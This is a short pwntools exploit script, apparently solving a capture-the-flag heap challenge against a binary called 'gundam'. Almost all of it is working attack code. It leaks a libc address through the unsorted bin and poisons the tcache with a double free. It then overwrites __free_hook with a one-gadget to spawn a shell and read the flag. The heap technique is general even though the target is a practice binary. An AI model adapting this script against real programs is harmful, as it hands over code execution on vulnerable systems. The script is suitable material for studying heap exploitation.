from pwn import *

s = process('./gundam')
e = ELF('./gundam')

def build(name, types):
    s.sendline('1')
    s.recvuntil('The name of gundam :')
    s.sendline(name)
    s.recvuntil('The type of the gundam :')
    s.sendline(types)
    s.recvuntil('Your choice : ')

def visit():
    s.sendline('2')
    s.recvuntil('hhhhhhh\n')
    leak = u64(s.recv(6)+'\x00'*2) 
    s.recvuntil('Your choice : ')
    return leak

def destroy(index):
    s.sendline('3')
    s.recvuntil('Which gundam do you want to Destory:')
    s.sendline(index)
    s.recvuntil('Your choice : ')

def blow():
    s.sendline('4')
    s.recvuntil('Your choice : ')

def exit():
    s.sendline('5')

def get_shell():
    s.sendline('3')
    s.recv()
    s.sendline('0')
    s.sendline('id')
    s.sendline('cat flag')

s.recvuntil('Your choice : ')

# allocate 9 smallbins
build('0', '1')
build('1', '1')
build('2', '1')
build('3', '1')
build('4', '1')
build('5', '1')
build('6', '1')
build('7', '1')
build('8', '1')

# free first 7 smallbins into tcache
# last one as unsorted bin ( make sure not adjacent to top chunk )
destroy('0')
destroy('1')
destroy('2')
destroy('3')
destroy('4')
destroy('5')
destroy('6')
destroy('7')

# free up the list 
blow()

# again allocate 8 smallbins to leak the heap_arena written in unsorted bin
build('a'*7, '1')
build('b'*7, '1')
build('c'*7, '1')
build('d'*7, '1')
build('e'*7, '1')
build('f'*7, '1')
build('g'*7, '1')
build('h'*7, '1')

# leaked value
libc = visit() - 4111520
free_hook = libc + 4118760
oneshot = libc + 0x4f322

# free up some space and double-free heap
destroy('4')
destroy('3')
destroy('2')
destroy('1')
destroy('1')

# free up 
blow()

# overwrite free_hook -> execve('/bin/sh');
build(p64(free_hook), '1')
build(p64(0x4141414141414141), '1')
build(p64(oneshot), '1')

# get shell
get_shell()

s.interactive()
